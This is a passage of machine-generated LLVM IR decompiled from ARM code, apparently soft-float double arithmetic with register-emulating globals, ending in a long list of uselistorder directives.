  br i1 %v14_1ee30, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1ee34 = sub i32 %v1_1ee34, %v15_1ee28
  store i32 %v3_1ee34, i32* %r6.global-to-local, align 4
  store i32 %v7_1ee30, i32* %r5.global-to-local, align 4
  %v5_1ee3c = udiv i32 %v0_1ee60, 8
  %v6_1ee3c = or i32 %v1_1ee3c, %v5_1ee3c
  store i32 %v6_1ee3c, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_1ee4c = phi i32 [ %v1_1ee34, %.thread8 ], [ %v3_1ee34, %bb102 ]
  %v0_1ee48 = phi i32 [ %v0_1ee30, %.thread8 ], [ %v7_1ee30, %bb102 ]
  %v2_1ee84 = phi i32 [ %v1_1ee3c, %.thread8 ], [ %v6_1ee3c, %bb102 ]
  %v1_1ede832 = phi i32 [ %v1_1ede833, %.thread8 ], [ %v6_1ee3c, %bb102 ]
  %v1_1ee0443 = phi i32 [ %v1_1ee0444, %.thread8 ], [ %v6_1ee3c, %bb102 ]
  %v1_1ee2052 = phi i32 [ %v1_1ee2053, %.thread8 ], [ %v6_1ee3c, %bb102 ]
  %v2_1ee40 = or i32 %v0_1ee48, %v1_1ee4c
  %v4_1ee40 = icmp eq i32 %v2_1ee40, 0
  br i1 %v4_1ee40, label %dec_label_pc_1ee80, label %dec_label_pc_1ee48

dec_label_pc_1ee48:                               ; preds = %.thread10
  %v3_1ee48 = mul i32 %v0_1ee48, 16
  %v4_1ee4c = udiv i32 %v1_1ee4c, 268435456
  %v5_1ee4c = or i32 %v3_1ee48, %v4_1ee4c
  store i32 %v5_1ee4c, i32* %r5.global-to-local, align 4
  %v3_1ee50 = mul i32 %v1_1ee4c, 16
  store i32 %v3_1ee50, i32* %r6.global-to-local, align 4
  %v3_1ee54 = mul nuw i32 %v3_1ee24, 8
  %v4_1ee58 = udiv i32 %v15_1ee28, 536870912
  %v5_1ee58 = or i32 %v4_1ee58, %v3_1ee54
  %v3_1ee5c = mul i32 %v15_1ee28, 8
  %v3_1ee60 = udiv i32 %v0_1ee60, 16
  store i32 %v3_1ee60, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ee60, 16
  br i1 %tmp, label %dec_label_pc_1ee68, label %dec_label_pc_1edd8

dec_label_pc_1ee68:                               ; preds = %dec_label_pc_1ee48
  %v1_1ee68 = and i32 %v1_1ee84.ph, 1048576
  %v2_1ee68 = icmp eq i32 %v1_1ee68, 0
  br i1 %v2_1ee68, label %dec_label_pc_1ee70, label %.thread11.loopexit

dec_label_pc_1ee70:                               ; preds = %dec_label_pc_1ee68
  %v2_1ee70 = or i32 %v2_1ee84, %v1_1ee84.ph
  store i32 %v2_1ee70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1edd8.outer

dec_label_pc_1ee80:                               ; preds = %.thread10
  store i32 %v15_1ee28, i32* %r3.global-to-local, align 4
  store i32 %v3_1ee24, i32* %r2.global-to-local, align 4
  %v1_1ee80 = and i32 %v1_1ee84.ph, 1048576
  %v2_1ee80 = icmp eq i32 %v1_1ee80, 0
  br i1 %v2_1ee80, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_1ee80
  %v3_1ee84 = or i32 %v2_1ee84, %v1_1ee84.ph
  store i32 %v3_1ee84, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1ee68
  store i32 %v3_1ee5c, i32* %r3.global-to-local, align 4
  store i32 %v5_1ee58, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1ee80, %bb103
  %v1_1ee8c = add nsw i32 %v4_1edac, 515
  store i32 %v1_1ee8c, i32* %ip.global-to-local, align 4
  %v2_1ee8c = icmp ugt i32 %v1_1edb0, 252
  %v7_1ee8c = icmp eq i32 %v1_1edb0, 253
  %v2_1ee90 = xor i1 %v7_1ee8c, true
  %v3_1ee90 = and i1 %v2_1ee8c, %v2_1ee90
  br i1 %v3_1ee90, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_1ee90 = icmp ugt i32 %v1_1ee8c, 1791
  %v11_1ee90 = icmp eq i32 %v1_1ee8c, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_1ee94 = phi i1 [ %v7_1ee8c, %.thread11 ], [ %v11_1ee90, %bb104 ]
  %v0_1ee94 = phi i1 [ %v2_1ee8c, %.thread11 ], [ %v6_1ee90, %bb104 ]
  %v2_1ee94 = xor i1 %v1_1ee94, true
  %v3_1ee94 = and i1 %v0_1ee94, %v2_1ee94
  call void @__pseudo_cond_branch(i1 %v3_1ee94, i32 ptrtoint (i32* @global_var_1ebc4.1785 to i32))
  %v0_1ee98 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ee98 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ee98 = sub i32 %v0_1ee98, %v1_1ee98
  store i32 %v2_1ee98, i32* %ip.global-to-local, align 4
  %v3_1ee98 = icmp uge i32 %v0_1ee98, %v1_1ee98
  %v9_1ee98 = icmp eq i32 %v0_1ee98, %v1_1ee98
  br i1 %v9_1ee98, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_1ee9c = load i32, i32* %r6.global-to-local, align 4
  %v2_1ee9c = load i32, i32* %r3.global-to-local, align 4
  %v3_1ee9c = sub i32 %v1_1ee9c, %v2_1ee9c
  store i32 %v3_1ee9c, i32* %ip.global-to-local, align 4
  %v4_1ee9c = icmp uge i32 %v1_1ee9c, %v2_1ee9c
  %v10_1ee9c = icmp eq i32 %v1_1ee9c, %v2_1ee9c
  br i1 %v10_1ee9c, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_1eea0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1eea0 = urem i32 %v1_1eea0, 2
  %v3_1eea0 = icmp ne i32 %v2_1eea0, 0
  %v4_1eea0 = udiv i32 %v1_1eea0, 2
  store i32 %v4_1eea0, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_1eea4 = phi i1 [ %v3_1ee98, %bb105 ], [ %v4_1ee9c, %bb106 ], [ %v3_1eea0, %bb107 ]
  %v0_1eea4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1eea4 = zext i1 %v1_1eea4 to i32
  %v3_1eea4 = add i32 %v2_1eea4, %v0_1eea4
  store i32 %v3_1eea4, i32* %r1.global-to-local, align 4
  %v0_1eea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1eea8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1eea8 = and i32 %v1_1eea8, 4096
  %v3_1eea8 = icmp ne i32 %v2_1eea8, 0
  %v4_1eea8 = mul i32 %v1_1eea8, 1048576
  %v6_1eea8 = add i32 %v4_1eea8, %v0_1eea8
  %v7_1eea8 = zext i1 %v3_1eea8 to i32
  %v8_1eea8 = add i32 %v7_1eea8, %v6_1eea8
  store i32 %v8_1eea8, i32* %r0.global-to-local, align 4
  %v2_1eeac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1eeac, i32* %r4.global-to-local, align 4
  store i32 %v6_1ed4c, i32* %r5.global-to-local, align 4
  store i32 %v9_1ed4c, i32* %r6.global-to-local, align 4
  ret i32 %v8_1eea8

dec_label_pc_1eeb0:                               ; preds = %dec_label_pc_1ed6c
  %v1_1eeb0 = and i32 %v2_1ed70, -2147483648
  %v4_1eeb4 = urem i32 %v1_1ed58, 1048576
  %v5_1eeb4 = or i32 %v1_1eeb0, %v4_1eeb4
  store i32 %v5_1eeb4, i32* %r0.global-to-local, align 4
  %v6_1eeb8 = add nsw i32 %v2_1ed6c, 1023
  store i32 %v6_1eeb8, i32* %r4.global-to-local, align 4
  %v8_1eeb8 = sub nsw i32 0, %v2_1ed6c
  %v9_1eeb8 = and i32 %v6_1eeb8, %v8_1eeb8
  %v11_1eeb8 = icmp slt i32 %v2_1ed6c, -1023
  %v12_1eeb8 = icmp eq i32 %v6_1eeb8, 0
  %v7_1eebc = icmp sgt i32 %v2_1ed6c, -1023
  br i1 %v7_1eebc, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_1eeb0
  %v10_1eebc = sub nsw i32 1024, %v2_1ed6c
  store i32 %v10_1eebc, i32* %r5.global-to-local, align 4
  %v14_1eebc = and i32 %v10_1eebc, %v6_1eeb8
  %v16_1eebc = icmp slt i32 %v10_1eebc, 0
  %v17_1eebc = icmp eq i32 %v6_1eeb8, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_1eeb0, %bb108
  %v2_1eec4.in = phi i32 [ %v9_1eeb8, %dec_label_pc_1eeb0 ], [ %v14_1eebc, %bb108 ]
  %v1_1eec4 = phi i1 [ %v11_1eeb8, %dec_label_pc_1eeb0 ], [ %v16_1eebc, %bb108 ]
  %v0_1eec4 = phi i1 [ %v12_1eeb8, %dec_label_pc_1eeb0 ], [ %v17_1eebc, %bb108 ]
  %v2_1eec4 = icmp slt i32 %v2_1eec4.in, 0
  %v3_1eec0 = xor i1 %v2_1eec4, %v1_1eec4
  %v4_1eec0 = or i1 %v0_1eec4, %v3_1eec0
  br i1 %v4_1eec0, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1eec085 = mul i32 %v6_1eeb8, 1048576
  %v10_1eec086 = or i32 %v9_1eec085, %v5_1eeb4
  store i32 %v10_1eec086, i32* %r0.global-to-local, align 4
  store i32 %v3_1ed4c, i32* %r4.global-to-local, align 4
  store i32 %v6_1ed4c, i32* %r5.global-to-local, align 4
  ret i32 %v10_1eec086

bb111:                                            ; preds = %bb109
  %v1_1eec8 = or i32 %v5_1eeb4, 1048576
  store i32 %v1_1eec8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1eed0 = add nsw i32 %v2_1ed6c, 1022
  store i32 %v1_1eed0, i32* @r4, align 4
  %v3_1eed0 = sub nsw i32 -1023, %v2_1ed6c
  %v4_1eed0 = and i32 %v6_1eeb8, %v3_1eed0
  %v5_1eed0 = icmp slt i32 %v4_1eed0, 0
  store i1 %v5_1eed0, i1* @cpsr_v, align 1
  %v6_1eed0 = icmp slt i32 %v2_1ed6c, -1022
  store i1 %v6_1eed0, i1* @cpsr_n, align 1
  %v7_1eed0 = icmp eq i32 %v6_1eeb8, 1
  store i1 %v7_1eed0, i1* @cpsr_z, align 1
  %v1_1eed4 = call i32 @function_1ebc4(i32 %v1_1eec8)
  store i32 %v1_1eed4, i32* %r0.global-to-local, align 4
  %v0_1eed8 = load i32, i32* @r5, align 4
  %v1_1eed8 = load i32, i32* @r6, align 4
  %v2_1eed8 = or i32 %v1_1eed8, %v0_1eed8
  store i32 %v2_1eed8, i32* @lr, align 4
  %v1_1eedc = call i32 @function_1ebc4(i32 %v1_1eed4)
  store i32 %v1_1eedc, i32* %r0.global-to-local, align 4
  %v0_1eee0.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1eee4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1eee0

dec_label_pc_1eee0:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_1eee0.pre-phi = phi i32 [ %v5_1ed5c, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_1ed5c, %bb93 ], [ %v5_1ed5c, %bb111 ]
  %v0_1eee4 = phi i32 [ %v5_1ed58, %.thread1 ], [ %v5_1ed58, %.thread2 ], [ %v5_1ed58, %bb93 ], [ %v0_1eee4.pre, %bb111 ]
  %v2_1eee8 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_1eee0.pre, %bb111 ]
  %v5_1eee0 = and i32 %v2_1eee8, %v4_1eee0.pre-phi
  store i32 %v5_1eee0, i32* @r5, align 4
  %v4_1eee4 = icmp eq i32 %v2_1eee8, %v0_1eee4
  br i1 %v4_1eee4, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_1eee0
  %v5_1eee8 = icmp eq i32 %v5_1eee0, %v2_1eee8
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_1eee0, %bb112
  %v0_1eeec = phi i1 [ false, %dec_label_pc_1eee0 ], [ %v5_1eee8, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1eeec, i32 ptrtoint (i32* @global_var_1ed40.1786 to i32))
  %v0_1eef0 = load i32, i32* @r4, align 4
  %v1_1eef0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1eef0 = icmp eq i32 %v1_1eef0, %v0_1eef0
  br i1 %v4_1eef0, label %dec_label_pc_1eef8, label %dec_label_pc_1ef14

dec_label_pc_1eef8:                               ; preds = %bb113
  %v0_1eef8 = load i32, i32* @r1, align 4
  %v1_1eef8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1eef8 = mul i32 %v1_1eef8, 4096
  %v5_1eef8 = or i32 %v4_1eef8, %v0_1eef8
  store i32 %v5_1eef8, i32* %r4.global-to-local, align 4
  %v1_1eefc = icmp ne i32 %v5_1eef8, 0
  call void @__pseudo_cond_branch(i1 %v1_1eefc, i32 ptrtoint (i32* @global_var_1ed40.1786 to i32))
  %v0_1ef00 = load i32, i32* @r5, align 4
  %v1_1ef00 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ef04 = icmp ne i32 %v1_1ef00, %v0_1ef00
  call void @__pseudo_cond_branch(i1 %v1_1ef04, i32 ptrtoint (i32* @global_var_1ed28.1787 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1ef10 = call i32 @function_1ed40(i32 %arg3, i32 %arg4)
  store i32 %v2_1ef10, i32* %r0.global-to-local, align 4
  %v1_1ef14.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1ef14

dec_label_pc_1ef14:                               ; preds = %bb113, %dec_label_pc_1eef8
  %v1_1ef14 = phi i32 [ %v1_1eef0, %bb113 ], [ %v1_1ef14.pre, %dec_label_pc_1eef8 ]
  %v0_1ef14 = load i32, i32* @r5, align 4
  %v4_1ef14 = icmp eq i32 %v0_1ef14, %v1_1ef14
  br i1 %v4_1ef14, label %dec_label_pc_1ef1c, label %dec_label_pc_1ef14.dec_label_pc_1ef30_crit_edge

dec_label_pc_1ef14.dec_label_pc_1ef30_crit_edge:  ; preds = %dec_label_pc_1ef14
  %v1_1ef30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ef30

dec_label_pc_1ef1c:                               ; preds = %dec_label_pc_1ef14
  %v4_1ef1c = mul i32 %arg3, 4096
  %v5_1ef1c = or i32 %v4_1ef1c, %arg4
  store i32 %v5_1ef1c, i32* %r5.global-to-local, align 4
  %v7_1ef1c = icmp eq i32 %v5_1ef1c, 0
  call void @__pseudo_cond_branch(i1 %v7_1ef1c, i32 ptrtoint (i32* @global_var_1ecdc.1788 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1ef2c = call i32 @function_1ed40(i32 %arg3, i32 %arg4)
  store i32 %v2_1ef2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ef30

dec_label_pc_1ef30:                               ; preds = %dec_label_pc_1ef14.dec_label_pc_1ef30_crit_edge, %dec_label_pc_1ef1c
  %v1_1ef30 = phi i32 [ %v1_1ef30.pre, %dec_label_pc_1ef14.dec_label_pc_1ef30_crit_edge ], [ %v2_1ef2c, %dec_label_pc_1ef1c ]
  %v0_1ef30 = load i32, i32* @r1, align 4
  %v3_1ef30 = mul i32 %v1_1ef30, 2
  %v4_1ef30 = or i32 %v3_1ef30, %v0_1ef30
  store i32 %v4_1ef30, i32* %r6.global-to-local, align 4
  %v6_1ef30 = icmp eq i32 %v4_1ef30, 0
  br i1 %v6_1ef30, label %dec_label_pc_1ef30._crit_edge, label %bb114

dec_label_pc_1ef30._crit_edge:                    ; preds = %dec_label_pc_1ef30
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_1ef30
  %v4_1ef34 = mul i32 %arg3, 2
  %v5_1ef34 = or i32 %v4_1ef34, %arg4
  store i32 %v5_1ef34, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1ef34, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_1ef30._crit_edge, %bb114
  %v4_1ef44.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1ef30._crit_edge ], [ %v5_1ef34, %bb114 ]
  %v0_1ef38 = phi i1 [ false, %dec_label_pc_1ef30._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1ef38, i32 ptrtoint (i32* @global_var_1ec74.1789 to i32))
  %v0_1ef3c = load i32, i32* @r1, align 4
  %v1_1ef3c = load i32, i32* %r0.global-to-local, align 4
  %v3_1ef3c = mul i32 %v1_1ef3c, 2
  %v4_1ef3c = or i32 %v3_1ef3c, %v0_1ef3c
  store i32 %v4_1ef3c, i32* %r4.global-to-local, align 4
  %v1_1ef40 = icmp ne i32 %v4_1ef3c, 0
  call void @__pseudo_cond_branch(i1 %v1_1ef40, i32 ptrtoint (i32* @global_var_1ed28.1787 to i32))
  store i32 %v4_1ef44.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1ef48 = icmp ne i32 %v4_1ef44.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1ef48, i32 ptrtoint (i32* @global_var_1ecdc.1788 to i32))
  %v0_1ef4c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ef4c = load i32, i32* @r1, align 4
  %v2_1ef4c = call i32 @function_1ed40(i32 %v0_1ef4c, i32 %v1_1ef4c)
  store i32 %v2_1ef4c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1ef4c

; uselistorder directives
  uselistorder i32 %v5_1ef34, { 1, 0, 2 }
  uselistorder i32 %v1_1eef0, { 1, 0 }
  uselistorder i32 %v10_1eebc, { 2, 0, 1 }
  uselistorder i32 %v6_1eeb8, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_1eeb4, { 1, 0, 2 }
  uselistorder i32 %v2_1ee9c, { 1, 0, 2 }
  uselistorder i32 %v1_1ee9c, { 1, 0, 2 }
  uselistorder i32 %v1_1ee98, { 1, 0, 2 }
  uselistorder i32 %v0_1ee98, { 1, 0, 2 }
  uselistorder i1 %v7_1ee8c, { 1, 0 }
  uselistorder i32 %v2_1ee70, { 1, 0 }
  uselistorder i32 %v3_1ee5c, { 2, 1, 0 }
  uselistorder i32 %v3_1ee50, { 0, 2, 1 }
  uselistorder i32 %v5_1ee4c, { 2, 0, 1 }
  uselistorder i32 %v6_1ee3c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1ee28, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1ee24, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1ee30, { 0, 2, 1 }
  uselistorder i32 %v1_1ee3c, { 1, 0 }
  uselistorder i32 %v6_1ee20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1ee0c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1ee08, { 0, 2, 1 }
  uselistorder i32 %v0_1ee14, { 0, 2, 1 }
  uselistorder i32 %v1_1ee20, { 1, 0 }
  uselistorder i32 %v6_1ee04, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1edf0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1edf8, { 0, 2, 1 }
  uselistorder i32 %v1_1ee04, { 1, 0 }
  uselistorder i32 %v3_1ede8, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1eddc, { 1, 2, 0 }
  uselistorder i32 %v3_1ee5c13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1ee5817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1eddc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ede8, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1ee84.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1edc8, { 1, 0 }
  uselistorder i32 %v0_1edcc, { 1, 0 }
  uselistorder i32 %v3_1edb8, { 1, 0 }
  uselistorder i1 %v1_1edac, { 1, 0 }
  uselistorder i32 %v3_1ed9c, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1ed98, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1ed90, { 2, 1, 0 }
  uselistorder i32 %v5_1ed8c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1ed6c, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_1ed5c, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1ed5c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1ed58, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1ed58, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1ed4c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %r0.global-to-local, { 17, 18, 19, 15, 3, 20, 21, 4, 13, 14, 16, 5, 2, 6, 7, 10, 8, 9, 11, 12, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 7, 8, 6, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_1ed40, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1ebc4, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 24, 21, 22, 23, 25, 3, 26, 1, 4, 16, 17, 18, 5, 6, 19, 7, 20, 8, 11, 12, 10, 13, 9, 14, 15 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 1, 17, 18, 19, 20, 22, 23, 24, 25, 30, 31, 32, 3, 29, 28, 26, 27, 21, 37, 5, 6, 36, 35, 34, 0, 33, 4 }
  uselistorder i32 536870912, { 2, 3, 0, 6, 7, 1, 4, 5 }
  uselistorder i32 16, { 1, 7, 5, 6, 8, 9, 30, 10, 11, 2, 12, 13, 14, 34, 98, 99, 106, 108, 15, 109, 16, 112, 113, 48, 114, 116, 129, 130, 131, 132, 17, 133, 134, 121, 122, 135, 136, 76, 73, 74, 75, 110, 111, 69, 70, 71, 72, 117, 118, 119, 120, 107, 3, 137, 138, 139, 140, 38, 39, 40, 166, 41, 167, 168, 42, 169, 170, 43, 171, 172, 173, 174, 175, 176, 126, 127, 123, 124, 125, 100, 101, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 18, 128, 19, 148, 44, 154, 102, 103, 49, 50, 104, 105, 77, 78, 79, 35, 115, 45, 80, 96, 81, 162, 163, 0, 164, 165, 177, 32, 155, 156, 157, 158, 159, 160, 65, 149, 150, 82, 20, 21, 22, 23, 24, 31, 25, 26, 4, 27, 28, 36, 51, 52, 83, 84, 85, 86, 87, 53, 88, 54, 89, 55, 90, 91, 56, 57, 46, 58, 92, 59, 60, 93, 47, 66, 67, 61, 68, 94, 33, 37, 95, 97, 62, 161, 29, 63, 64 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 86, 87, 39, 6, 7, 25, 8, 133, 134, 141, 143, 144, 145, 146, 9, 147, 149, 150, 151, 152, 154, 40, 96, 72, 73, 88, 163, 164, 165, 166, 34, 167, 176, 97, 98, 99, 148, 155, 156, 157, 158, 159, 160, 161, 162, 142, 177, 178, 216, 263, 63, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 64, 168, 169, 170, 171, 179, 180, 181, 182, 183, 184, 185, 186, 187, 10, 65, 188, 48, 189, 89, 190, 191, 192, 172, 173, 37, 174, 175, 193, 194, 195, 153, 135, 136, 137, 138, 139, 140, 100, 101, 102, 74, 280, 41, 103, 127, 130, 104, 105, 38, 217, 218, 219, 220, 221, 222, 11, 76, 223, 224, 225, 226, 227, 228, 229, 230, 12, 231, 232, 233, 234, 13, 235, 236, 14, 237, 238, 239, 240, 36, 241, 242, 243, 244, 245, 246, 254, 247, 248, 249, 250, 77, 27, 251, 252, 253, 78, 79, 15, 255, 256, 257, 258, 260, 261, 80, 16, 262, 17, 259, 279, 68, 69, 66, 67, 28, 29, 45, 46, 70, 281, 198, 199, 200, 90, 201, 202, 203, 204, 35, 205, 81, 82, 206, 207, 208, 71, 209, 210, 211, 212, 30, 31, 213, 214, 215, 83, 196, 197, 106, 18, 19, 91, 42, 20, 21, 26, 22, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 84, 32, 23, 117, 85, 33, 24, 118, 119, 120, 121, 75, 122, 123, 124, 125, 126, 44, 62, 60, 61, 43, 59, 57, 58, 56, 54, 55, 53, 52, 50, 51, 92, 93, 94, 95, 49, 47, 128, 129, 131, 132 }
  uselistorder i32 4, { 5, 6, 192, 251, 252, 193, 7, 8, 253, 254, 255, 256, 257, 64, 258, 259, 267, 269, 270, 106, 271, 272, 273, 83, 274, 278, 131, 279, 280, 281, 282, 283, 284, 9, 285, 132, 107, 133, 0, 1, 134, 288, 310, 311, 108, 312, 135, 136, 137, 138, 313, 314, 110, 315, 109, 316, 317, 318, 319, 320, 301, 302, 303, 207, 208, 275, 276, 277, 203, 204, 205, 206, 289, 290, 291, 292, 293, 294, 295, 296, 297, 10, 298, 299, 300, 268, 11, 321, 12, 322, 361, 260, 13, 234, 323, 14, 105, 96, 97, 15, 419, 98, 87, 16, 17, 99, 100, 420, 421, 422, 423, 101, 424, 425, 426, 427, 102, 428, 429, 430, 431, 432, 18, 433, 434, 435, 436, 437, 103, 86, 438, 439, 440, 441, 442, 443, 19, 20, 104, 304, 305, 111, 324, 325, 326, 327, 328, 329, 330, 331, 332, 84, 333, 334, 335, 336, 338, 306, 21, 307, 112, 308, 309, 337, 286, 287, 339, 139, 261, 262, 263, 264, 265, 266, 22, 209, 210, 211, 212, 23, 213, 444, 445, 447, 24, 448, 201, 364, 365, 366, 367, 140, 25, 214, 141, 215, 142, 88, 216, 241, 242, 243, 246, 247, 248, 249, 143, 144, 217, 145, 146, 218, 26, 219, 220, 85, 89, 370, 371, 372, 373, 374, 375, 147, 148, 27, 376, 377, 378, 379, 380, 381, 382, 383, 149, 368, 369, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 150, 151, 152, 397, 398, 401, 404, 399, 400, 113, 153, 402, 65, 403, 194, 405, 406, 407, 409, 90, 154, 29, 28, 408, 155, 156, 157, 362, 158, 360, 159, 221, 446, 418, 30, 31, 2, 340, 32, 33, 160, 66, 34, 35, 161, 36, 162, 163, 164, 341, 342, 37, 343, 165, 344, 345, 346, 347, 348, 349, 350, 166, 351, 352, 353, 354, 355, 356, 67, 195, 357, 359, 167, 168, 358, 196, 38, 39, 92, 40, 41, 93, 410, 411, 197, 42, 43, 68, 69, 70, 44, 45, 46, 71, 47, 48, 169, 49, 222, 223, 114, 224, 115, 225, 116, 226, 227, 228, 117, 229, 118, 230, 231, 72, 170, 232, 119, 73, 171, 120, 74, 233, 121, 75, 172, 122, 76, 236, 235, 237, 238, 94, 240, 239, 95, 123, 77, 50, 124, 173, 174, 175, 176, 177, 178, 198, 179, 180, 126, 199, 127, 51, 181, 125, 52, 200, 130, 53, 54, 91, 55, 56, 78, 182, 244, 245, 183, 250, 184, 79, 80, 57, 58, 59, 128, 81, 185, 129, 186, 82, 187, 188, 60, 363, 61, 62, 63, 412, 413, 414, 415, 416, 417, 189, 190, 191, 3, 4, 202 }
  uselistorder i32 32, { 78, 79, 80, 81, 39, 40, 47, 65, 66, 42, 82, 41, 48, 83, 84, 85, 86, 45, 87, 88, 90, 91, 63, 105, 56, 67, 106, 92, 93, 68, 69, 70, 71, 96, 97, 89, 120, 49, 50, 43, 100, 98, 99, 107, 57, 28, 108, 109, 101, 102, 103, 104, 58, 64, 94, 95, 52, 51, 1, 2, 4, 3, 121, 6, 5, 8, 7, 10, 9, 44, 110, 111, 27, 112, 0, 59, 113, 114, 115, 116, 117, 118, 29, 119, 72, 73, 122, 60, 61, 12, 11, 31, 14, 13, 30, 16, 15, 32, 46, 74, 75, 76, 18, 17, 33, 20, 19, 34, 53, 62, 77, 35, 22, 21, 24, 23, 36, 37, 26, 25, 38, 54, 55 }
  uselistorder i32 33, { 7, 8, 9, 3, 10, 11, 4, 5, 0, 2, 1, 6 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
